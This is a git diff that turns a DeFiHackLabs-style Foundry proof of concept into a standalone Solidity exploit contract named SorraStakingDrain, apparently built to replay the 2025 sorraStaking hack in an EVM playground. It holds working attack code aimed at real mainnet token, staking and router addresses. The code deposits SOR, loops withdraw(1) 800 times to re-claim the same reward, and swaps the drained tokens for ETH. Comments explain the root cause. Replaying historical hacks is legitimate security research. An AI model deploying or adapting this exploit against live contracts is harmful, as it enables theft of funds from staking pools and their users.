@@ -1,70 +1,102 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
-import "../interface.sol";
+// Synthetic standalone exploit for the EVM Playground (2025-01-sorraStaking).
+// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
+// (attacker = address(this); no flash-loan callback is needed at all — the
+// attacker just deposits real SOR it already holds, waits out the 14-day lock,
+// then loops withdraw(1)). There is no standalone exploit contract to deploy.
+// This contract is a faithful, self-contained copy of that inline attack
+// (test/sorraStaking.sol: ContractTest.testExploit), so the playground can
+// deploy it and record run(). Logic and constants are copied verbatim, with one
+// adaptation: the original test deposits BEFORE `cheats.warp(+14 days + 1)`, so
+// `deposit()`'s `depositTime` is stamped at the PRE-warp timestamp and the lock
+// has genuinely elapsed by the time `withdraw` runs. The playground instead
+// replays the ENTIRE recorded call at a single fixed (already-warped) block
+// timestamp — so if `deposit()` ran inside the recorded call, its `depositTime`
+// would equal the warped `block.timestamp` and the lock would never appear
+// elapsed. To reproduce this faithfully, `deposit()` is split out into `prep()`,
+// invoked from the config's `setup.steps` (unrecorded, at the ORIGINAL dumped
+// fork timestamp, exactly like the real pre-warp deposit tx) — then the config's
+// `setup.blockTimestamp` warps forward +14 days + 1 for the recorded `run()`,
+// which only contains the withdraw loop and the cash-out swaps (mirroring the
+// real attack's SEPARATE deposit and attack transactions 14 days apart). The
+// attacker's SOR balance (`deal(SOR, address(this), 122868.87e18)` in setUp())
+// is expressed as the config's `setup.dealToken`, called before `prep()`.
+//
+// Root cause: sorraStaking.withdraw(_amount) computes `rewardAmount =
+// getPendingRewards(sender)` from the position's ENTIRE totalAmount (not the
+// `_amount` being withdrawn) and pays it out IN FULL on every successful call,
+// while `_decreasePosition` only shaves `_amount` (1 wei) off the principal.
+// There is no "reward already claimed" bookkeeping, so the exact same ~5%
+// reward is payable again on the very next call. Looping withdraw(1) drains
+// the pool's reward reserve far beyond the position's genuine one-time reward.
 
-// reason : wrong reward calculate
-// guy    : https://x.com/TenArmorAlert/status/1875582709512188394
-// tx     : https://app.blocksec.com/explorer/tx/eth/0x72a252277e30ea6a37d2dc9905c280f3bc389b87f72b81a59aa8f50baebd8eaa -->deposit
-//        : https://app.blocksec.com/explorer/tx/eth/0x6439d63cc57fb68a32ea8ffd8f02496e8abad67292be94904c0b47a4d14ce90d -->attack
-// total loss : 4.8 + 2.4 + 0.8 eth
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function approve(address, uint256) external returns (bool);
+    function transfer(address, uint256) external returns (bool);
+}
 
-contract ContractTest is Test {
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    IERC20 SOR = IERC20(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF);
-    address sorStaking = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;
-    Uni_Router_V2 router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+interface ISorraStaking {
+    function deposit(uint256 amount, uint8 tier) external;
+    function withdraw(uint256 amount) external;
+}
 
+interface IUniRouterV2 {
+    function WETH() external pure returns (address);
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
 
-    function setUp() external {
-        cheats.createSelectFork("http://127.0.0.1:8545", 21450734);
-        // attacker buy sor
-        deal(address(SOR), address(this), 122868871710593438486048);
-        deal(address(this),0);
+contract SorraStakingDrain {
+    address private constant SOR = 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF;
+    address private constant SOR_STAKING = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;
+    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    uint256 private constant DEPOSIT_AMOUNT = 122868871710593438486048; // full attacker SOR balance
+    uint256 private constant MAX_SELL_AMOUNT = 700000000000000000000000; // per-swap max sell amount
+
+    IERC20 private constant sor = IERC20(SOR);
+    ISorraStaking private constant staking = ISorraStaking(SOR_STAKING);
+    IUniRouterV2 private constant router = IUniRouterV2(ROUTER);
+
+    // Pre-attack prep (called from the config's setup.steps, unrecorded, at the
+    // ORIGINAL dumped fork timestamp): deposit the full SOR balance at tier 0
+    // (5%, 14-day lock). Mirrors the real deposit transaction, which happened
+    // 14 days before the real attack transaction.
+    function prep() external {
+        sor.approve(SOR_STAKING, type(uint256).max);
+        staking.deposit(DEPOSIT_AMOUNT, 0);
     }
 
-    function testExploit() external {
-        emit log_named_decimal_uint("[Begin] ETH balance before", address(this).balance, 18);
-        SOR.approve(sorStaking, type(uint256).max);
-
-        bytes memory depositData = abi.encodeWithSignature(
-            "deposit(uint256,uint8)",
-            122868871710593438486048,  // 使用全部SOR代币数量
-            0  // tier设为0
-        );
-
-        (bool success,) = sorStaking.call(depositData);
-        require(success, "deposit failed");
-        console.log("Current before block timestamp:", block.timestamp);
-        cheats.warp(block.timestamp + 14 days + 1);
-        console.log("Current after block timestamp:", block.timestamp);
-        bytes memory withdrawData = abi.encodeWithSignature(
-            "withdraw(uint256)",
-            1
-        );
-        
-        for(uint i = 0; i < 800; i++) {
-            (bool withdrawSuccess,) = sorStaking.call(withdrawData);
-            require(withdrawSuccess, "withdraw failed");
+    // Recorded attack (runs after the config's setup.blockTimestamp warps
+    // forward +14 days + 1, so the deposit's lock has genuinely elapsed): loop
+    // withdraw(1) to re-claim the full position reward 800 times, then sell the
+    // drained SOR for ETH across 7 swaps (SOR has a 5% sell tax).
+    function run() external {
+        for (uint256 i = 0; i < 800; i++) {
+            staking.withdraw(1);
         }
 
-        // 将SOR代币换成ETH,只wrap了时间，没有roll blocknumber所以兑换的eth会有差异
-        SOR.approve(address(router), SOR.balanceOf(address(this)));
+        sor.approve(ROUTER, sor.balanceOf(address(this)));
         address[] memory path = new address[](2);
-        path[0] = address(SOR);
-        path[1] = address(router.WETH());
-        for(uint i = 0; i < 7; i++) {
+        path[0] = SOR;
+        path[1] = router.WETH();
+        for (uint256 i = 0; i < 7; i++) {
             router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                700000000000000000000000, // --> max sell amount 
+                MAX_SELL_AMOUNT,
                 0,
                 path,
                 address(this),
                 block.timestamp
             );
         }
-
-        emit log_named_decimal_uint("[End] ETH balance after", address(this).balance, 18);
     }
 
     receive() external payable {}
